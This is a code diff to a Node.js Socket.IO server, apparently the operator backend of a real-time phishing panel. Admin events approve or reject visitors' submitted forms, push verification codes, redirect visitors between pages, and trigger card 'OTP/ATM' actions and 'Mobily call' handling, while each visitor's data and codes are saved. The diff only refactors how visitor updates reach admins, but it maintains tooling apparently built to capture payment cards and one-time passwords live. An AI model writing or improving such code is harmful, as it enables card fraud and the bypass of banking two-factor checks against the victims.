@@ -533,16 +533,29 @@ io.on("connection", (socket) => {
     }
   });
 
+  // === Helper: Send lightweight visitor update to admins ===
+  function sendVisitorUpdate(visitor) {
+    // Send only the changed visitor instead of all visitors
+    const lightUpdate = [{
+      _id: visitor._id,
+      waitingForAdminResponse: visitor.waitingForAdminResponse,
+      page: visitor.page,
+      lastSentCode: visitor.lastSentCode,
+    }];
+    admins.forEach((admin, adminSocketId) => {
+      io.to(adminSocketId).emit("visitors:update", lightUpdate);
+    });
+  }
+
   // Admin: Approve form
   socket.on("admin:approve", (visitorSocketId) => {
     io.to(visitorSocketId).emit("form:approved");
-    // تحديث حالة الانتظار
     const visitor = visitors.get(visitorSocketId);
     if (visitor) {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
-      io.emit("visitors:update", Array.from(visitors.values()));
+      sendVisitorUpdate(visitor);
     }
     console.log(`Form approved for visitor: ${visitorSocketId}`);
   });
@@ -551,13 +564,12 @@ io.on("connection", (socket) => {
   socket.on("admin:reject", (data) => {
     const visitorSocketId = data.visitorSocketId || data;
     io.to(visitorSocketId).emit("form:rejected");
-    // تحديث حالة الانتظار
     const visitor = visitors.get(visitorSocketId);
     if (visitor) {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
-      io.emit("visitors:update", Array.from(visitors.values()));
+      sendVisitorUpdate(visitor);
     }
     console.log(`Form rejected for visitor: ${visitorSocketId}`);
   });
@@ -565,13 +577,12 @@ io.on("connection", (socket) => {
   // Admin: Reject Mobily call (special handling for Mobily page)
   socket.on("admin:mobilyReject", (visitorSocketId) => {
     io.to(visitorSocketId).emit("mobily:rejected");
-    // تحديث حالة الانتظار
     const visitor = visitors.get(visitorSocketId);
     if (visitor) {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
-      io.emit("visitors:update", Array.from(visitors.values()));
+      sendVisitorUpdate(visitor);
     }
     console.log(`Mobily call rejected for visitor: ${visitorSocketId}`);
   });
@@ -579,14 +590,13 @@ io.on("connection", (socket) => {
   // Admin: Send verification code
   socket.on("admin:sendCode", ({ visitorSocketId, code }) => {
     io.to(visitorSocketId).emit("code", code);
-    // حفظ الرمز في بيانات الزائر وتحديث حالة الانتظار
     const visitor = visitors.get(visitorSocketId);
     if (visitor) {
       visitor.lastSentCode = code;
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
-      io.emit("visitors:update", Array.from(visitors.values()));
+      sendVisitorUpdate(visitor);
     }
     console.log(`Code sent to visitor ${visitorSocketId}: ${code}`);
   });
@@ -594,13 +604,12 @@ io.on("connection", (socket) => {
   // Admin: Navigate visitor to page
   socket.on("admin:navigate", ({ visitorSocketId, page }) => {
     io.to(visitorSocketId).emit("visitor:navigate", page);
-    // تحديث حالة الانتظار
     const visitor = visitors.get(visitorSocketId);
     if (visitor) {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
-      io.emit("visitors:update", Array.from(visitors.values()));
+      sendVisitorUpdate(visitor);
     }
     console.log(`Navigating visitor ${visitorSocketId} to: ${page}`);
   });
@@ -608,13 +617,12 @@ io.on("connection", (socket) => {
   // Admin: Card action (OTP, ATM, Reject)
   socket.on("admin:cardAction", ({ visitorSocketId, action }) => {
     io.to(visitorSocketId).emit("card:action", action);
-    // تحديث حالة الانتظار
     const visitor = visitors.get(visitorSocketId);
     if (visitor) {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
-      io.emit("visitors:update", Array.from(visitors.values()));
+      sendVisitorUpdate(visitor);
     }
     console.log(`Card action ${action} sent to visitor ${visitorSocketId}`);
   });
@@ -622,13 +630,12 @@ io.on("connection", (socket) => {
   // Admin: Code action (Approve, Reject) for OTP/digit codes
   socket.on("admin:codeAction", ({ visitorSocketId, action, codeIndex }) => {
     io.to(visitorSocketId).emit("code:action", { action, codeIndex });
-    // تحديث حالة الانتظار
     const visitor = visitors.get(visitorSocketId);
     if (visitor) {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
-      io.emit("visitors:update", Array.from(visitors.values()));
+      sendVisitorUpdate(visitor);
     }
     console.log(`Code action ${action} sent to visitor ${visitorSocketId}`);
   });
@@ -636,13 +643,12 @@ io.on("connection", (socket) => {
   // Admin: Approve resend code request
   socket.on("admin:approveResend", ({ visitorSocketId }) => {
     io.to(visitorSocketId).emit("resend:approved");
-    // تحديث حالة الانتظار
     const visitor = visitors.get(visitorSocketId);
     if (visitor) {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
-      io.emit("visitors:update", Array.from(visitors.values()));
+      sendVisitorUpdate(visitor);
     }
     console.log(`Resend approved for visitor ${visitorSocketId}`);
   });
